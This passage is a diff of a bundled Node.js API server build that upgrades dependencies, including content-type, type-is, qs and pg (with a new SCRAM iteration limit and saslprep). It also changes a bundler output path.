@@ -5635,106 +5635,133 @@ var require_on_finished = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/content-type@1.0.5/node_modules/content-type/index.js
-var require_content_type = __commonJS({
-  "../../node_modules/.pnpm/content-type@1.0.5/node_modules/content-type/index.js"(exports) {
+// ../../node_modules/.pnpm/content-type@2.0.0/node_modules/content-type/dist/index.js
+var require_dist = __commonJS({
+  "../../node_modules/.pnpm/content-type@2.0.0/node_modules/content-type/dist/index.js"(exports) {
     "use strict";
-    var PARAM_REGEXP = /; *([!#$%&'*+.^_`|~0-9A-Za-z-]+) *= *("(?:[\u000b\u0020\u0021\u0023-\u005b\u005d-\u007e\u0080-\u00ff]|\\[\u000b\u0020-\u00ff])*"|[!#$%&'*+.^_`|~0-9A-Za-z-]+) */g;
-    var TEXT_REGEXP = /^[\u000b\u0020-\u007e\u0080-\u00ff]+$/;
-    var TOKEN_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
-    var QESC_REGEXP = /\\([\u000b\u0020-\u00ff])/g;
-    var QUOTE_REGEXP = /([\\"])/g;
-    var TYPE_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+\/[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
+    Object.defineProperty(exports, "__esModule", { value: true });
     exports.format = format;
     exports.parse = parse;
+    var TEXT_REGEXP = /^[\u0009\u0020-\u007e\u0080-\u00ff]*$/;
+    var TOKEN_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
+    var QUOTE_REGEXP = /[\\"]/g;
+    var TYPE_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+\/[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
+    var NullObject = /* @__PURE__ */ (() => {
+      const C = function() {
+      };
+      C.prototype = /* @__PURE__ */ Object.create(null);
+      return C;
+    })();
     function format(obj) {
-      if (!obj || typeof obj !== "object") {
-        throw new TypeError("argument obj is required");
-      }
-      var parameters = obj.parameters;
-      var type = obj.type;
+      const { type, parameters } = obj;
       if (!type || !TYPE_REGEXP.test(type)) {
-        throw new TypeError("invalid type");
+        throw new TypeError(`Invalid type: ${type}`);
       }
-      var string = type;
-      if (parameters && typeof parameters === "object") {
-        var param;
-        var params = Object.keys(parameters).sort();
-        for (var i = 0; i < params.length; i++) {
-          param = params[i];
+      let result = type;
+      if (parameters) {
+        for (const param of Object.keys(parameters)) {
           if (!TOKEN_REGEXP.test(param)) {
-            throw new TypeError("invalid parameter name");
+            throw new TypeError(`Invalid parameter name: ${param}`);
           }
-          string += "; " + param + "=" + qstring(parameters[param]);
+          result += `; ${param}=${qstring(parameters[param])}`;
         }
       }
-      return string;
+      return result;
     }
-    function parse(string) {
-      if (!string) {
-        throw new TypeError("argument string is required");
-      }
-      var header = typeof string === "object" ? getcontenttype(string) : string;
-      if (typeof header !== "string") {
-        throw new TypeError("argument string is required to be a string");
-      }
-      var index = header.indexOf(";");
-      var type = index !== -1 ? header.slice(0, index).trim() : header.trim();
-      if (!TYPE_REGEXP.test(type)) {
-        throw new TypeError("invalid media type");
-      }
-      var obj = new ContentType(type.toLowerCase());
-      if (index !== -1) {
-        var key;
-        var match;
-        var value;
-        PARAM_REGEXP.lastIndex = index;
-        while (match = PARAM_REGEXP.exec(header)) {
-          if (match.index !== index) {
-            throw new TypeError("invalid parameter format");
-          }
-          index += match[0].length;
-          key = match[1].toLowerCase();
-          value = match[2];
-          if (value.charCodeAt(0) === 34) {
-            value = value.slice(1, -1);
-            if (value.indexOf("\\") !== -1) {
-              value = value.replace(QESC_REGEXP, "$1");
+    function parse(header, options) {
+      const len = header.length;
+      let index = skipOWS(header, 0, len);
+      const valueStart = index;
+      index = skipValue(header, index, len);
+      const valueEnd = trailingOWS(header, valueStart, index);
+      const type = header.slice(valueStart, valueEnd).toLowerCase();
+      const parameters = options?.parameters === false ? new NullObject() : parseParameters(header, index, len);
+      return { type, parameters };
+    }
+    var SP = 32;
+    var HTAB = 9;
+    var SEMI = 59;
+    var EQ = 61;
+    var DQUOTE = 34;
+    var BSLASH = 92;
+    function parseParameters(header, index, len) {
+      const parameters = new NullObject();
+      parameter: while (index < len) {
+        index = skipOWS(header, index + 1, len);
+        const keyStart = index;
+        while (index < len) {
+          const code = header.charCodeAt(index);
+          if (code === SEMI)
+            continue parameter;
+          if (code === EQ) {
+            const keyEnd = trailingOWS(header, keyStart, index);
+            const key = header.slice(keyStart, keyEnd).toLowerCase();
+            index = skipOWS(header, index + 1, len);
+            if (index < len && header.charCodeAt(index) === DQUOTE) {
+              index++;
+              let value = "";
+              while (index < len) {
+                const code2 = header.charCodeAt(index++);
+                if (code2 === DQUOTE) {
+                  index = skipValue(header, index, len);
+                  if (parameters[key] === void 0)
+                    parameters[key] = value;
+                  break;
+                }
+                if (code2 === BSLASH && index < len) {
+                  value += header[index++];
+                  continue;
+                }
+                value += String.fromCharCode(code2);
+              }
+              continue parameter;
             }
+            const valueStart = index;
+            index = skipValue(header, index, len);
+            if (parameters[key] === void 0) {
+              const valueEnd = trailingOWS(header, valueStart, index);
+              parameters[key] = header.slice(valueStart, valueEnd);
+            }
+            continue parameter;
           }
-          obj.parameters[key] = value;
-        }
-        if (index !== header.length) {
-          throw new TypeError("invalid parameter format");
+          index++;
         }
       }
-      return obj;
+      return parameters;
     }
-    function getcontenttype(obj) {
-      var header;
-      if (typeof obj.getHeader === "function") {
-        header = obj.getHeader("content-type");
-      } else if (typeof obj.headers === "object") {
-        header = obj.headers && obj.headers["content-type"];
+    function skipValue(str, index, len) {
+      while (index < len) {
+        const char = str.charCodeAt(index);
+        if (char === SEMI)
+          break;
+        index++;
       }
-      if (typeof header !== "string") {
-        throw new TypeError("content-type header is missing from object");
-      }
-      return header;
+      return index;
     }
-    function qstring(val) {
-      var str = String(val);
-      if (TOKEN_REGEXP.test(str)) {
+    function skipOWS(header, index, len) {
+      while (index < len) {
+        const char = header.charCodeAt(index);
+        if (char !== SP && char !== HTAB)
+          break;
+        index++;
+      }
+      return index;
+    }
+    function trailingOWS(header, start, end) {
+      while (end > start) {
+        const char = header.charCodeAt(end - 1);
+        if (char !== SP && char !== HTAB)
+          break;
+        end--;
+      }
+      return end;
+    }
+    function qstring(str) {
+      if (TOKEN_REGEXP.test(str))
         return str;
-      }
-      if (str.length > 0 && !TEXT_REGEXP.test(str)) {
-        throw new TypeError("invalid parameter value");
-      }
-      return '"' + str.replace(QUOTE_REGEXP, "\\$1") + '"';
-    }
-    function ContentType(type) {
-      this.parameters = /* @__PURE__ */ Object.create(null);
-      this.type = type;
+      if (TEXT_REGEXP.test(str))
+        return `"${str.replace(QUOTE_REGEXP, "\\$&")}"`;
+      throw new TypeError(`Invalid parameter value: ${str}`);
     }
   }
 });
@@ -15314,11 +15341,11 @@ var require_media_typer = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/type-is@2.0.1/node_modules/type-is/index.js
+// ../../node_modules/.pnpm/type-is@2.1.0/node_modules/type-is/index.js
 var require_type_is = __commonJS({
-  "../../node_modules/.pnpm/type-is@2.0.1/node_modules/type-is/index.js"(exports, module) {
+  "../../node_modules/.pnpm/type-is@2.1.0/node_modules/type-is/index.js"(exports, module) {
     "use strict";
-    var contentType = require_content_type();
+    var contentType = require_dist();
     var mime = require_mime_types();
     var typer = require_media_typer();
     module.exports = typeofrequest;
@@ -15327,9 +15354,12 @@ var require_type_is = __commonJS({
     module.exports.normalize = normalize;
     module.exports.match = mimeMatch;
     function typeis(value, types_) {
+      if (value && typeof value === "object") {
+        value = value.headers["content-type"];
+      }
       var i;
       var types2 = types_;
-      var val = tryNormalizeType(value);
+      var val = normalizeType(value);
       if (!val) {
         return false;
       }
@@ -15395,15 +15425,113 @@ var require_type_is = __commonJS({
       return true;
     }
     function normalizeType(value) {
-      var type = contentType.parse(value).type;
+      if (!value) return null;
+      var type = contentType.parse(value, { parameters: false }).type;
       return typer.test(type) ? type : null;
     }
-    function tryNormalizeType(value) {
-      try {
-        return value ? normalizeType(value) : null;
-      } catch (err) {
-        return null;
+  }
+});
+
+// ../../node_modules/.pnpm/content-type@1.0.5/node_modules/content-type/index.js
+var require_content_type = __commonJS({
+  "../../node_modules/.pnpm/content-type@1.0.5/node_modules/content-type/index.js"(exports) {
+    "use strict";
+    var PARAM_REGEXP = /; *([!#$%&'*+.^_`|~0-9A-Za-z-]+) *= *("(?:[\u000b\u0020\u0021\u0023-\u005b\u005d-\u007e\u0080-\u00ff]|\\[\u000b\u0020-\u00ff])*"|[!#$%&'*+.^_`|~0-9A-Za-z-]+) */g;
+    var TEXT_REGEXP = /^[\u000b\u0020-\u007e\u0080-\u00ff]+$/;
+    var TOKEN_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
+    var QESC_REGEXP = /\\([\u000b\u0020-\u00ff])/g;
+    var QUOTE_REGEXP = /([\\"])/g;
+    var TYPE_REGEXP = /^[!#$%&'*+.^_`|~0-9A-Za-z-]+\/[!#$%&'*+.^_`|~0-9A-Za-z-]+$/;
+    exports.format = format;
+    exports.parse = parse;
+    function format(obj) {
+      if (!obj || typeof obj !== "object") {
+        throw new TypeError("argument obj is required");
       }
+      var parameters = obj.parameters;
+      var type = obj.type;
+      if (!type || !TYPE_REGEXP.test(type)) {
+        throw new TypeError("invalid type");
+      }
+      var string = type;
+      if (parameters && typeof parameters === "object") {
+        var param;
+        var params = Object.keys(parameters).sort();
+        for (var i = 0; i < params.length; i++) {
+          param = params[i];
+          if (!TOKEN_REGEXP.test(param)) {
+            throw new TypeError("invalid parameter name");
+          }
+          string += "; " + param + "=" + qstring(parameters[param]);
+        }
+      }
+      return string;
+    }
+    function parse(string) {
+      if (!string) {
+        throw new TypeError("argument string is required");
+      }
+      var header = typeof string === "object" ? getcontenttype(string) : string;
+      if (typeof header !== "string") {
+        throw new TypeError("argument string is required to be a string");
+      }
+      var index = header.indexOf(";");
+      var type = index !== -1 ? header.slice(0, index).trim() : header.trim();
+      if (!TYPE_REGEXP.test(type)) {
+        throw new TypeError("invalid media type");
+      }
+      var obj = new ContentType(type.toLowerCase());
+      if (index !== -1) {
+        var key;
+        var match;
+        var value;
+        PARAM_REGEXP.lastIndex = index;
+        while (match = PARAM_REGEXP.exec(header)) {
+          if (match.index !== index) {
+            throw new TypeError("invalid parameter format");
+          }
+          index += match[0].length;
+          key = match[1].toLowerCase();
+          value = match[2];
+          if (value.charCodeAt(0) === 34) {
+            value = value.slice(1, -1);
+            if (value.indexOf("\\") !== -1) {
+              value = value.replace(QESC_REGEXP, "$1");
+            }
+          }
+          obj.parameters[key] = value;
+        }
+        if (index !== header.length) {
+          throw new TypeError("invalid parameter format");
+        }
+      }
+      return obj;
+    }
+    function getcontenttype(obj) {
+      var header;
+      if (typeof obj.getHeader === "function") {
+        header = obj.getHeader("content-type");
+      } else if (typeof obj.headers === "object") {
+        header = obj.headers && obj.headers["content-type"];
+      }
+      if (typeof header !== "string") {
+        throw new TypeError("content-type header is missing from object");
+      }
+      return header;
+    }
+    function qstring(val) {
+      var str = String(val);
+      if (TOKEN_REGEXP.test(str)) {
+        return str;
+      }
+      if (str.length > 0 && !TEXT_REGEXP.test(str)) {
+        throw new TypeError("invalid parameter value");
+      }
+      return '"' + str.replace(QUOTE_REGEXP, "\\$1") + '"';
+    }
+    function ContentType(type) {
+      this.parameters = /* @__PURE__ */ Object.create(null);
+      this.type = type;
     }
   }
 });
@@ -16377,9 +16505,9 @@ var require_side_channel_list = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/es-object-atoms@1.1.1/node_modules/es-object-atoms/index.js
+// ../../node_modules/.pnpm/es-object-atoms@1.1.2/node_modules/es-object-atoms/index.js
 var require_es_object_atoms = __commonJS({
-  "../../node_modules/.pnpm/es-object-atoms@1.1.1/node_modules/es-object-atoms/index.js"(exports, module) {
+  "../../node_modules/.pnpm/es-object-atoms@1.1.2/node_modules/es-object-atoms/index.js"(exports, module) {
     "use strict";
     module.exports = Object;
   }
@@ -16830,9 +16958,9 @@ var require_get_proto = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/hasown@2.0.3/node_modules/hasown/index.js
+// ../../node_modules/.pnpm/hasown@2.0.4/node_modules/hasown/index.js
 var require_hasown = __commonJS({
-  "../../node_modules/.pnpm/hasown@2.0.3/node_modules/hasown/index.js"(exports, module) {
+  "../../node_modules/.pnpm/hasown@2.0.4/node_modules/hasown/index.js"(exports, module) {
     "use strict";
     var call = Function.prototype.call;
     var $hasOwn = Object.prototype.hasOwnProperty;
@@ -17363,9 +17491,9 @@ var require_side_channel = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/formats.js
+// ../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/formats.js
 var require_formats = __commonJS({
-  "../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/formats.js"(exports, module) {
+  "../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/formats.js"(exports, module) {
     "use strict";
     var replace = String.prototype.replace;
     var percentTwenties = /%20/g;
@@ -17389,9 +17517,9 @@ var require_formats = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/utils.js
+// ../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/utils.js
 var require_utils2 = __commonJS({
-  "../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/utils.js"(exports, module) {
+  "../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/utils.js"(exports, module) {
     "use strict";
     var formats = require_formats();
     var getSideChannel = require_side_channel();
@@ -17653,9 +17781,9 @@ var require_utils2 = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/stringify.js
+// ../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/stringify.js
 var require_stringify = __commonJS({
-  "../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/stringify.js"(exports, module) {
+  "../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/stringify.js"(exports, module) {
     "use strict";
     var getSideChannel = require_side_channel();
     var utils = require_utils2();
@@ -17741,7 +17869,7 @@ var require_stringify = __commonJS({
       }
       if (obj === null) {
         if (strictNullHandling) {
-          return encoder && !encodeValuesOnly ? encoder(prefix, defaults2.encoder, charset, "key", format) : prefix;
+          return formatter(encoder && !encodeValuesOnly ? encoder(prefix, defaults2.encoder, charset, "key", format) : prefix);
         }
         obj = "";
       }
@@ -17759,7 +17887,9 @@ var require_stringify = __commonJS({
       var objKeys;
       if (generateArrayPrefix === "comma" && isArray(obj)) {
         if (encodeValuesOnly && encoder) {
-          obj = utils.maybeMap(obj, encoder);
+          obj = utils.maybeMap(obj, function(v) {
+            return v == null ? v : encoder(v);
+          });
         }
         objKeys = [{ value: obj.length > 0 ? obj.join(",") || null : void 0 }];
       } else if (isArray(filter)) {
@@ -17897,6 +18027,9 @@ var require_stringify = __commonJS({
       var sideChannel = getSideChannel();
       for (var i = 0; i < objKeys.length; ++i) {
         var key = objKeys[i];
+        if (typeof key === "undefined" || key === null) {
+          continue;
+        }
         var value = obj[key];
         if (options.skipNulls && value === null) {
           continue;
@@ -17926,9 +18059,9 @@ var require_stringify = __commonJS({
       var prefix = options.addQueryPrefix === true ? "?" : "";
       if (options.charsetSentinel) {
         if (options.charset === "iso-8859-1") {
-          prefix += "utf8=%26%2310003%3B&";
+          prefix += "utf8=%26%2310003%3B" + options.delimiter;
         } else {
-          prefix += "utf8=%E2%9C%93&";
+          prefix += "utf8=%E2%9C%93" + options.delimiter;
         }
       }
       return joined.length > 0 ? prefix + joined : "";
@@ -17936,9 +18069,9 @@ var require_stringify = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/parse.js
+// ../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/parse.js
 var require_parse = __commonJS({
-  "../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/parse.js"(exports, module) {
+  "../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/parse.js"(exports, module) {
     "use strict";
     var utils = require_utils2();
     var has = Object.prototype.hasOwnProperty;
@@ -18111,8 +18244,8 @@ var require_parse = __commonJS({
       }
       return leaf;
     };
-    var splitKeyIntoSegments = function splitKeyIntoSegments2(givenKey, options) {
-      var key = options.allowDots ? givenKey.replace(/\.([^.[]+)/g, "[$1]") : givenKey;
+    var splitKeyIntoSegments = function splitKeyIntoSegments2(originalKey, options) {
+      var key = options.allowDots ? originalKey.replace(/\.([^.[]+)/g, "[$1]") : originalKey;
       if (options.depth <= 0) {
         if (!options.plainObjects && has.call(Object.prototype, key)) {
           if (!options.allowPrototypes) {
@@ -18121,37 +18254,56 @@ var require_parse = __commonJS({
         }
         return [key];
       }
-      var brackets = /(\[[^[\]]*])/;
-      var child = /(\[[^[\]]*])/g;
-      var segment = brackets.exec(key);
-      var parent = segment ? key.slice(0, segment.index) : key;
-      var keys = [];
+      var segments = [];
+      var first = key.indexOf("[");
+      var parent = first >= 0 ? key.slice(0, first) : key;
       if (parent) {
         if (!options.plainObjects && has.call(Object.prototype, parent)) {
           if (!options.allowPrototypes) {
             return;
           }
         }
-        keys[keys.length] = parent;
+        segments[segments.length] = parent;
       }
-      var i = 0;
-      while ((segment = child.exec(key)) !== null && i < options.depth) {
-        i += 1;
-        var segmentContent = segment[1].slice(1, -1);
-        if (!options.plainObjects && has.call(Object.prototype, segmentContent)) {
-          if (!options.allowPrototypes) {
-            return;
+      var n = key.length;
+      var open = first;
+      var collected = 0;
+      while (open >= 0 && collected < options.depth) {
+        var level = 1;
+        var i = open + 1;
+        var close = -1;
+        while (i < n && close < 0) {
+          var cu = key.charCodeAt(i);
+          if (cu === 91) {
+            level += 1;
+          } else if (cu === 93) {
+            level -= 1;
+            if (level === 0) {
+              close = i;
+            }
           }
+          i += 1;
         }
-        keys[keys.length] = segment[1];
+        if (close < 0) {
+          segments[segments.length] = "[" + key.slice(open) + "]";
+          return segments;
+        }
+        var seg = key.slice(open, close + 1);
+        var content = seg.slice(1, -1);
+        if (!options.plainObjects && has.call(Object.prototype, content) && !options.allowPrototypes) {
+          return;
+        }
+        segments[segments.length] = seg;
+        collected += 1;
+        open = key.indexOf("[", close + 1);
       }
-      if (segment) {
+      if (open >= 0) {
         if (options.strictDepth === true) {
           throw new RangeError("Input depth exceeded depth option of " + options.depth + " and strictDepth is true");
         }
-        keys[keys.length] = "[" + key.slice(segment.index) + "]";
+        segments[segments.length] = "[" + key.slice(open) + "]";
       }
-      return keys;
+      return segments;
     };
     var parseKeys = function parseQueryStringKeys(givenKey, val, options, valuesParsed) {
       if (!givenKey) {
@@ -18235,9 +18387,9 @@ var require_parse = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/index.js
+// ../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/index.js
 var require_lib2 = __commonJS({
-  "../../node_modules/.pnpm/qs@6.15.1/node_modules/qs/lib/index.js"(exports, module) {
+  "../../node_modules/.pnpm/qs@6.15.2/node_modules/qs/lib/index.js"(exports, module) {
     "use strict";
     var stringify = require_stringify();
     var parse = require_parse();
@@ -19842,7 +19994,7 @@ var require_is_promise = __commonJS({
 });
 
 // ../../node_modules/.pnpm/path-to-regexp@8.4.2/node_modules/path-to-regexp/dist/index.js
-var require_dist = __commonJS({
+var require_dist2 = __commonJS({
   "../../node_modules/.pnpm/path-to-regexp@8.4.2/node_modules/path-to-regexp/dist/index.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
@@ -20215,7 +20367,7 @@ var require_layer = __commonJS({
   "../../node_modules/.pnpm/router@2.2.0/node_modules/router/lib/layer.js"(exports, module) {
     "use strict";
     var isPromise = require_is_promise();
-    var pathRegexp = require_dist();
+    var pathRegexp = require_dist2();
     var debug = require_src()("router:layer");
     var deprecate = require_depd()("router");
     var TRAILING_SLASH_REGEXP = /\/+$/;
@@ -27984,7 +28136,7 @@ var require_pino = __commonJS({
     function pinoBundlerAbsolutePath(p) {
       try {
         const path2 = __require("path");
-        const outputDir = "/home/runner/workspace/artifacts/api-server/dist";
+        const outputDir = "/tmp/tradeai-render/artifacts/api-server/dist";
         return path2.resolve(outputDir, p.replace(/^\.\//, ""));
       } catch (e) {
         const f = new Function("p", "return new URL(p, import.meta.url).pathname");
@@ -29378,9 +29530,9 @@ var require_pg_types = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/defaults.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/defaults.js
 var require_defaults = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/defaults.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/defaults.js"(exports, module) {
     "use strict";
     var user;
     try {
@@ -29445,13 +29597,12 @@ var require_defaults = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/utils.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/utils.js
 var require_utils4 = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/utils.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/utils.js"(exports, module) {
     "use strict";
     var defaults2 = require_defaults();
-    var util = __require("util");
-    var { isDate } = util.types || util;
+    var { isDate } = __require("util/types");
     function escapeElement(elementRepresentation) {
       const escaped = elementRepresentation.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
       return '"' + escaped + '"';
@@ -29460,28 +29611,23 @@ var require_utils4 = __commonJS({
       let result = "{";
       for (let i = 0; i < val.length; i++) {
         if (i > 0) {
-          result = result + ",";
+          result += ",";
         }
-        if (val[i] === null || typeof val[i] === "undefined") {
-          result = result + "NULL";
-        } else if (Array.isArray(val[i])) {
-          result = result + arrayString(val[i]);
-        } else if (ArrayBuffer.isView(val[i])) {
-          let item = val[i];
+        let item = val[i];
+        if (item == null) {
+          result += "NULL";
+        } else if (Array.isArray(item)) {
+          result += arrayString(item);
+        } else if (ArrayBuffer.isView(item)) {
           if (!(item instanceof Buffer)) {
-            const buf = Buffer.from(item.buffer, item.byteOffset, item.byteLength);
-            if (buf.length === item.byteLength) {
-              item = buf;
-            } else {
-              item = buf.slice(item.byteOffset, item.byteOffset + item.byteLength);
-            }
+            item = Buffer.from(item.buffer, item.byteOffset, item.byteLength);
           }
           result += "\\\\x" + item.toString("hex");
         } else {
-          result += escapeElement(prepareValue(val[i]));
+          result += escapeElement(prepareValue(item));
         }
       }
-      result = result + "}";
+      result += "}";
       return result;
     }
     var prepareValue = function(val, seen) {
@@ -29493,11 +29639,7 @@ var require_utils4 = __commonJS({
           return val;
         }
         if (ArrayBuffer.isView(val)) {
-          const buf = Buffer.from(val.buffer, val.byteOffset, val.byteLength);
-          if (buf.length === val.byteLength) {
-            return buf;
-          }
-          return buf.slice(val.byteOffset, val.byteOffset + val.byteLength);
+          return Buffer.from(val.buffer, val.byteOffset, val.byteLength);
         }
         if (isDate(val)) {
           if (defaults2.parseInputDatesAsUTC) {
@@ -29603,47 +29745,9 @@ var require_utils4 = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils-legacy.js
-var require_utils_legacy = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils-legacy.js"(exports, module) {
-    "use strict";
-    var nodeCrypto = __require("crypto");
-    function md5(string) {
-      return nodeCrypto.createHash("md5").update(string, "utf-8").digest("hex");
-    }
-    function postgresMd5PasswordHash(user, password, salt) {
-      const inner = md5(password + user);
-      const outer = md5(Buffer.concat([Buffer.from(inner), salt]));
-      return "md5" + outer;
-    }
-    function sha256(text) {
-      return nodeCrypto.createHash("sha256").update(text).digest();
-    }
-    function hashByName(hashName, text) {
-      hashName = hashName.replace(/(\D)-/, "$1");
-      return nodeCrypto.createHash(hashName).update(text).digest();
-    }
-    function hmacSha256(key, msg) {
-      return nodeCrypto.createHmac("sha256", key).update(msg).digest();
-    }
-    async function deriveKey(password, salt, iterations) {
-      return nodeCrypto.pbkdf2Sync(password, salt, iterations, 32, "sha256");
-    }
-    module.exports = {
-      postgresMd5PasswordHash,
-      randomBytes: nodeCrypto.randomBytes,
-      deriveKey,
-      sha256,
-      hashByName,
-      hmacSha256,
-      md5
-    };
-  }
-});
-
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils-webcrypto.js
-var require_utils_webcrypto = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils-webcrypto.js"(exports, module) {
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/utils.js
+var require_utils5 = __commonJS({
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/utils.js"(exports, module) {
     var nodeCrypto = __require("crypto");
     module.exports = {
       postgresMd5PasswordHash,
@@ -29692,22 +29796,9 @@ var require_utils_webcrypto = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils.js
-var require_utils5 = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/utils.js"(exports, module) {
-    "use strict";
-    var useLegacyCrypto = parseInt(process.versions && process.versions.node && process.versions.node.split(".")[0]) < 15;
-    if (useLegacyCrypto) {
-      module.exports = require_utils_legacy();
-    } else {
-      module.exports = require_utils_webcrypto();
-    }
-  }
-});
-
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/cert-signatures.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/cert-signatures.js
 var require_cert_signatures = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/cert-signatures.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/cert-signatures.js"(exports, module) {
     function x509Error(msg, cert) {
       return new Error("SASL channel binding: " + msg + " when parsing public certificate " + cert.toString("base64"));
     }
@@ -29818,13 +29909,19 @@ var require_cert_signatures = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/sasl.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/sasl.js
 var require_sasl = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/crypto/sasl.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/crypto/sasl.js"(exports, module) {
     "use strict";
     var crypto = require_utils5();
     var { signatureAlgorithmHashFromCertificate } = require_cert_signatures();
-    function startSession(mechanisms, stream) {
+    function saslprep(password) {
+      const nonAsciiSpace = /[\u00A0\u1680\u2000-\u200B\u202F\u205F\u3000]/g;
+      const mappedToNothing = /[\u00AD\u034F\u1806\u180B\u180C\u180D\u200C\u200D\u2060\uFE00-\uFE0F\uFEFF]/g;
+      return password.replace(nonAsciiSpace, " ").replace(mappedToNothing, "").normalize("NFKC");
+    }
+    var DEFAULT_MAX_SCRAM_ITERATIONS = 1e5;
+    function startSession(mechanisms, stream, scramMaxIterations = DEFAULT_MAX_SCRAM_ITERATIONS) {
       const candidates = ["SCRAM-SHA-256"];
       if (stream) candidates.unshift("SCRAM-SHA-256-PLUS");
       const mechanism = candidates.find((candidate) => mechanisms.includes(candidate));
@@ -29840,7 +29937,8 @@ var require_sasl = __commonJS({
         mechanism,
         clientNonce,
         response: gs2Header + ",,n=*,r=" + clientNonce,
-        message: "SASLInitialResponse"
+        message: "SASLInitialResponse",
+        scramMaxIterations
       };
     }
     async function continueSession(session, password, serverData, stream) {
@@ -29862,6 +29960,12 @@ var require_sasl = __commonJS({
       } else if (sv.nonce.length === session.clientNonce.length) {
         throw new Error("SASL: SCRAM-SERVER-FIRST-MESSAGE: server nonce is too short");
       }
+      const scramMaxIterations = typeof session.scramMaxIterations === "number" ? session.scramMaxIterations : DEFAULT_MAX_SCRAM_ITERATIONS;
+      if (scramMaxIterations !== 0 && sv.iteration > scramMaxIterations) {
+        throw new Error(
+          "SASL: SCRAM-SERVER-FIRST-MESSAGE: iteration count " + sv.iteration + " exceeds scramMaxIterations of " + scramMaxIterations
+        );
+      }
       const clientFirstMessageBare = "n=*,r=" + session.clientNonce;
       const serverFirstMessage = "r=" + sv.nonce + ",s=" + sv.salt + ",i=" + sv.iteration;
       let channelBinding = stream ? "eSws" : "biws";
@@ -29876,7 +29980,7 @@ var require_sasl = __commonJS({
       const clientFinalMessageWithoutProof = "c=" + channelBinding + ",r=" + sv.nonce;
       const authMessage = clientFirstMessageBare + "," + serverFirstMessage + "," + clientFinalMessageWithoutProof;
       const saltBytes = Buffer.from(sv.salt, "base64");
-      const saltedPassword = await crypto.deriveKey(password, saltBytes, sv.iteration);
+      const saltedPassword = await crypto.deriveKey(saslprep(password), saltBytes, sv.iteration);
       const clientKey = await crypto.hmacSha256(saltedPassword, "Client Key");
       const storedKey = await crypto.sha256(clientKey);
       const clientSignature = await crypto.hmacSha256(storedKey, authMessage);
@@ -29952,7 +30056,11 @@ var require_sasl = __commonJS({
     }
     function parseServerFinalMessage(serverData) {
       const attrPairs = parseAttributePairs(serverData);
+      const error = attrPairs.get("e");
       const serverSignature = attrPairs.get("v");
+      if (error) {
+        throw new Error(`SASL: SCRAM-SERVER-FINAL-MESSAGE: server returned error: "${error}"`);
+      }
       if (!serverSignature) {
